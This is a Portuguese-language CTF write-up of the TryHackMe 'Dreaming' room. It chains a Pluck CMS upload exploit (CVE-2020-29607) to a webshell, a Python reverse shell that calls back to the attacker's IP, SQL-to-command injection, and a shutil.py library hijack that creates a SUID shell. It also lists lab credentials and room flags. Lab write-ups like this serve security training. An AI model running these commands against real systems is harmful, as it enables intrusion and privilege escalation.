# 💤 Dreaming — CTF Writeup
### TryHackMe | Boot-to-Root | Pluck CMS RCE (CVE-2020-29607) · SQLi → Command Injection · Python Library Hijacking

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 29/07/2026                                                                             |
| **Data do Pentest**   | 29/07/2026 · 21:01 – 23:02 (GMT-3)                                                     |
| **Alvo**              | `10.64.129.118` / `10.64.154.52` — TryHackMe · Dreaming                                |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Gobuster 3.8.2 · CeWL · SearchSploit (CVE-2020-29607) · Netcat · MySQL client · LinPEAS |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Dreaming** (TryHackMe), um host **Ubuntu Linux**, por meio de uma cadeia de ataque em **múltiplos estágios**: reconhecimento de rede, enumeração web revelando uma instalação do **Pluck CMS 4.7.13**, geração de wordlist customizada a partir do próprio conteúdo do site com **CeWL**, acesso administrativo ao CMS, exploração de uma vulnerabilidade de upload de arquivos autenticada (**CVE-2020-29607**) para obtenção de webshell e reverse shell como `www-data`, escalada de privilégios para o usuário `lucien` através de credenciais expostas em um script Python, escalada adicional para o usuário `death` através de uma **injeção SQL que resultou em injeção de comando**, e finalmente escalada para o usuário `morpheus` através de uma técnica de **sequestro de biblioteca Python** (`shutil.py`) explorada por um processo agendado privilegiado. **Três flags** foram capturadas ao longo da cadeia, refletindo a temática da sala baseada no universo de *The Sandman*.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                  | Versão  | Finalidade                                                                          |
|-------------------------------|---------|--------------------------------------------------------------------------------------|
| **Nmap**                     | 7.99    | Varredura de portas e fingerprinting de serviços (`-sV -sC`)                        |
| **Gobuster**                 | 3.8.2   | Enumeração de diretórios web (wordlist `common.txt`, extensões txt/html/php)        |
| **CeWL**                     | 6.2.1   | Geração de wordlist customizada a partir do conteúdo da página web                  |
| **SearchSploit / Exploit-DB**| -       | Localização do exploit para `CVE-2020-29607` (Pluck CMS)                            |
| **Netcat**                   | -       | Listener para recepção da reverse shell (`nc -lvnp 4444`)                           |
| **MySQL client**             | 8.0.41  | Exploração de injeção de comando via manipulação de dados na tabela `dreams`        |
| **LinPEAS**                  | -       | Enumeração de vetores de escalada de privilégios locais                             |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **21:01 GMT-3 · Nmap 7.99**

```bash
sudo nmap -sV -sC -T3 10.64.129.118
```
![Nmap](/CTFs/Dreaming/images/Nmap_Result.png)

Dois serviços expostos: `22/tcp` (OpenSSH 8.2p1 Ubuntu) e `80/tcp` (Apache httpd 2.4.41 Ubuntu, página padrão). Nenhuma informação adicional revelada — a investigação seguiu para o serviço web.

---

### FASE 2 — Enumeração Web: Gobuster

> **21:12 GMT-3**

```bash
gobuster dir -u http://10.64.154.52/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30 -x txt,html,php
```

![Gobuster](/CTFs/Dreaming/images/Gobuster.png)

```
app   (Status: 301) [Size: 310] → http://10.64.154.52/app/
```

O diretório `/app/` redirecionava para uma instalação do **Pluck CMS 4.7.13**.

---

### FASE 3 — Análise de Conteúdo: Página "dreaming" e Wordlist com CeWL

> **21:11 – 21:20 GMT-3**

O acesso a `http://10.64.154.52/app/pluck-4.7.13/?file=dreaming` exibiu uma citação temática:

```
What power would hell have if those here imprisoned were not able to dream of heaven?
```

![Website dreaming](/CTFs/Dreaming/images/app.png)

![Painel Adm.](/CTFs/Dreaming/images/Login.pgp_Reached_in_SourceCode_app.png)

---

### FASE 4 — Acesso Administrativo: Login no Pluck CMS

> **21:20 GMT-3**

Das palavras extraídas, **`password`** foi testado diretamente contra o formulário de login (autenticação single-password, sem campo de usuário) e concedeu acesso ao painel administrativo.

Com a hipótese de que o conteúdo do site poderia conter a senha de acesso, o **CeWL** foi utilizado para gerar uma wordlist a partir do texto da página:

```bash
cewl http://10.64.154.52/app/pluck-4.7.13/?file=dreaming -d 3 -m 8 -w wordlist.txt
cat wordlist.txt
```

![Cewl](/CTFs/Dreaming/images/Wordlist_and_Login.png)

```
dreaming
imprisoned
password
available
```

> 🚩 **Acesso administrativo (Pluck CMS): senha `password`**

---

### FASE 5 — Exploração: CVE-2020-29607 (Pluck CMS File Upload RCE)

> **21:21 – 21:35 GMT-3**

Com acesso admin confirmado, a versão 4.7.13 do Pluck CMS revelou a vulnerabilidade **CVE-2020-29607**: bypass de restrição de upload de arquivos, permitindo a um administrador autenticado obter RCE via a funcionalidade "manage files".

![CVE](/CTFs/Dreaming/images/Exploit_Reached.png)

```bash
searchsploit pluck 4.7.13
searchsploit -m php/webapps/49909.py
python3 49909.py 10.64.154.52 80 password /app/pluck-4.7.13
```

![Exploit](/CTFs/Dreaming/images/Web_Shell.png)

```
Authentification was succesfull, uploading webshell
Uploaded Webshell to: http://10.64.154.52:80/app/pluck-4.7.13/files/shell.phar
```

(A primeira tentativa, com a senha incorretamente capitalizada "Password", falhou — a senha correta era em minúsculas.)

---

### FASE 6 — Acesso Inicial: Reverse Shell como www-data

> **21:45 GMT-3**

O webshell (pOwny Shell) confirmou execução de comandos, porém sem permissão para ler arquivos de outros usuários. Um payload de reverse shell em Python foi executado através do webshell:

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("192.168.157.47",4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn("/bin/bash")'
```

```bash
nc -lvnp 4444
```

![Reverse Shell](/CTFs/Dreaming/images/Shell_Reverse_Up.png)

```
connect to [192.168.157.47] from (UNKNOWN) [10.64.154.52] 60840
www-data@ip-10-64-154-52:/var/www/html/app/pluck-4.7.13/files$
```

---

### FASE 7 — Escalada de Privilégios: www-data → lucien (1º Flag)

> **21:56 GMT-3**

```bash
find / -user lucien 2>/dev/null
```

Localizou `/opt/test.py`, de propriedade de `lucien`, contendo uma credencial em texto claro:

```python
#Todo add myself as a user
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#1999!"
```

```bash
su lucien
# Password: HeyLucien#1999!
cat /home/lucien/lucien_flag.txt
```
![Flag and Priv. Escalation](/CTFs/Dreaming/images/Elevate_Priv(Lucien)_and_1º%20Flag.png)
> 🚩 **lucien_flag.txt — FLAG CAPTURADA: `THM{TH3_L1BR4R14N}`**

---

### FASE 8 — Escalada de Privilégios: lucien → death via SQLi/Command Injection (2º Flag)

> **22:18 – 22:32 GMT-3**

A enumeração revelou que `lucien` podia executar, como `death` via sudo, um script Python (`getDreams.py`) que consulta a tabela `dreams` do MySQL e ecoa cada registro através de `subprocess(shell=True)` — vulnerável a injeção de comando.

```bash
mysql -u lucien -plucien42DBPASSWORD
USE library;
INSERT INTO dreams (dreamer,dream) VALUES ('test','; /bin/bash');
```

```bash
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

**Trecho vulnerável de getDreams.py:**
```python
DB_USER = "death"
DB_PASS = "!mementoMORI666!"
DB_NAME = "library"
...
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

![Elevate Priv.](/CTFs/Dreaming/images/Elevate_Priv(Death).png)

A execução do script processou o registro malicioso, disparando `/bin/bash` como `death`:

```bash
cat death_flag.txt
```
![Second Flag](/CTFs/Dreaming/images/Second_Flag_and_Pass_death.png)
> 🚩 **death_flag.txt — FLAG CAPTURADA: `THM{1M_TH3R3_4_TH3M}`**

---

### FASE 9 — Enumeração Pós-Exploração: LinPEAS

> **22:51 GMT-3**

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp linpeas.sh death@10.64.154.52:/tmp/
```

![LinPeas](/CTFs/Dreaming/images/Subindo_LinPeas.png)

O LinPEAS foi transferido para automatizar a busca por vetores adicionais de escalada de privilégios.

---

### FASE 10 — Escalada de Privilégios Final: death → morpheus (Python Library Hijacking)

> **22:41 – 23:02 GMT-3**

O LinPEAS identificou que `death` possuía **permissão de escrita** sobre `/usr/lib/python3.8/shutil.py` — biblioteca amplamente importada por scripts e tarefas agendadas do sistema.

```bash
nano /usr/lib/python3.8/shutil.py
```

**Payload inserido:**
```python
os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")
```

![Payload](/CTFs/Dreaming/images/Vector_of_3º%20Escalation.png)

```bash
watch -n 1 'ls -l /tmp/rootbash'
```

Após a execução de uma tarefa agendada (cron) pertencente a `morpheus` que importava `shutil`, o binário SUID `/tmp/rootbash` foi criado, herdando o UID efetivo de `morpheus`:

```bash
/tmp/rootbash -p
cd /home/morpheus
cat morpheus_flag.txt
```

![Third Flag](/CTFs/Dreaming/images/3º%20Flag.png)
> 🚩 **morpheus_flag.txt — FLAG FINAL CAPTURADA: `THM{DR34MS_5H4P3_TH3_W0RLD}`**

Uma tentativa de acesso a `/root` confirmou "Permission denied" — a shell obtida herdava os privilégios de `morpheus`, não de `root`, delimitando o escopo real da escalada (consistente com a narrativa temática da sala: restaurar o reino do Senhor dos Sonhos).

---

## ⛓ Linha do Tempo do Comprometimento

```
[21:01 GMT-3] FASE 1 — RECONHECIMENTO (Nmap 7.99)
    SSH (22) e Apache 2.4.41 (80) identificados
    ↓
[21:12 GMT-3] FASE 2 — ENUMERAÇÃO WEB (Gobuster)
    /app/ → Pluck CMS 4.7.13
    ↓
[21:11-21:20 GMT-3] FASE 3 — CONTEÚDO + WORDLIST (CeWL)
    Página "dreaming" → wordlist: dreaming, imprisoned, password, available
    ↓
[21:20 GMT-3] FASE 4 — ACESSO ADMIN (Pluck CMS)
    Senha "password" → painel administrativo
    ↓
[21:21-21:35 GMT-3] FASE 5 — EXPLORAÇÃO (CVE-2020-29607)
    49909.py → webshell enviado (shell.phar)
    ↓
[21:45 GMT-3] FASE 6 — ACESSO INICIAL (Reverse Shell)
    Payload Python via webshell → shell como www-data
    ↓
[21:56 GMT-3] FASE 7 — PRIVESC → lucien
    Credencial em /opt/test.py → su lucien
    FLAG: THM{TH3_L1BR4R14N} ✓
    ↓
[22:18-22:32 GMT-3] FASE 8 — PRIVESC → death
    SQLi → Command Injection (getDreams.py, shell=True)
    FLAG: THM{1M_TH3R3_4_TH3M} ✓
    ↓
[22:51 GMT-3] FASE 9 — ENUMERAÇÃO (LinPEAS)
    shutil.py gravável identificado
    ↓
[22:41-23:02 GMT-3] FASE 10 — PRIVESC FINAL → morpheus
    Python Library Hijacking (shutil.py) → SUID /tmp/rootbash
    FLAG FINAL: THM{DR34MS_5H4P3_TH3_W0RLD} ✓
    ↓
[23:02 GMT-3] COMPROMETIMENTO CONCLUÍDO — shell como morpheus
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap 7.99 | SSH (22) e Apache (80) identificados |
| Enumeração Web | Gobuster | `/app/` → Pluck CMS 4.7.13 |
| Wordlist Customizada | CeWL | Palavra-chave: `password` |
| Acesso Admin | Login Pluck CMS | Autenticado como admin |
| Exploração RCE | `CVE-2020-29607` (49909.py) | Webshell enviado (`shell.phar`) |
| Acesso Inicial | Reverse shell Python + Netcat | Shell como `www-data` |
| PrivEsc → lucien | Credencial em `/opt/test.py` | Flag: `THM{TH3_L1BR4R14N}` |
| PrivEsc → death | SQLi/Command Injection | Flag: `THM{1M_TH3R3_4_TH3M}` |
| Enumeração | LinPEAS | `shutil.py` gravável identificado |
| PrivEsc Final → morpheus | Python Library Hijacking | Flag: `THM{DR34MS_5H4P3_TH3_W0RLD}` |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.64.129.118` / `10.64.154.52` | Máquina Dreaming (TryHackMe) — Ubuntu Linux |
| Serviços expostos | `22/TCP` (OpenSSH) · `80/TCP` (Apache 2.4.41) | Superfície de ataque inicial |
| Aplicação vulnerável | Pluck CMS 4.7.13 (`/app/`) | Autenticação single-password |
| Vulnerabilidade | `CVE-2020-29607` | Bypass de restrição de upload (RCE autenticado) |
| Exploit utilizado | `php/webapps/49909.py` | Pluck CMS File Upload RCE |
| Credencial CMS | `password` | Extraída via wordlist gerada pelo CeWL |
| Credencial lucien | `HeyLucien#1999!` | Exposta em `/opt/test.py` |
| Credencial MySQL (lucien) | `lucien42DBPASSWORD` | Uso do cliente MySQL |
| Vulnerabilidade de código | `subprocess(shell=True)` em `getDreams.py` | Permite Command Injection via dados do MySQL |
| Credencial death (DB) | `!mementoMORI666!` | Hardcoded em `getDreams.py` |
| Arquivo gravável | `/usr/lib/python3.8/shutil.py` | Permite library hijacking |
| Técnica de escalada final | SUID `/tmp/rootbash` via cron de morpheus | Herda privilégios de `morpheus` |
| Flag 1 | `THM{TH3_L1BR4R14N}` | `/home/lucien/lucien_flag.txt` |
| Flag 2 | `THM{1M_TH3R3_4_TH3M}` | `/home/death/death_flag.txt` |
| Flag 3 (final) | `THM{DR34MS_5H4P3_TH3_W0RLD}` | `/home/morpheus/morpheus_flag.txt` |
| Técnica (MITRE ATT&CK) | `T1190` | Exploit Public-Facing Application |
| Técnica (MITRE ATT&CK) | `T1552.001` | Unsecured Credentials: Credentials In Files |
| Técnica (MITRE ATT&CK) | `T1059` | Command and Scripting Interpreter (Command Injection) |
| Técnica (MITRE ATT&CK) | `T1574` | Hijack Execution Flow |

---

## ✅ Resumo das Flags

| # | Flag | Valor | Usuário |
|---|------|-------|---------|
| 🚩 Flag 1 | `lucien_flag.txt` | `THM{TH3_L1BR4R14N}` | lucien |
| 🚩 Flag 2 | `death_flag.txt` | `THM{1M_TH3R3_4_TH3M}` | death |
| 🚩 Flag 3 (final) | `morpheus_flag.txt` | `THM{DR34MS_5H4P3_TH3_W0RLD}` | morpheus |

---

## 📚 Referências

- [TryHackMe — Dreaming](https://tryhackme.com/room/dreaming)
- [Exploit-DB — Pluck CMS 4.7.13 File Upload RCE (CVE-2020-29607)](https://www.exploit-db.com/exploits/49909)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [CeWL — Custom Word List Generator](https://github.com/digininja/CeWL)
- [LinPEAS — PEASS-ng](https://github.com/peass-ng/PEASS-ng)
- [MITRE ATT&CK T1190 — Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190/)
- [MITRE ATT&CK T1552.001 — Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- [MITRE ATT&CK T1059 — Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
- [MITRE ATT&CK T1574 — Hijack Execution Flow](https://attack.mitre.org/techniques/T1574/)

---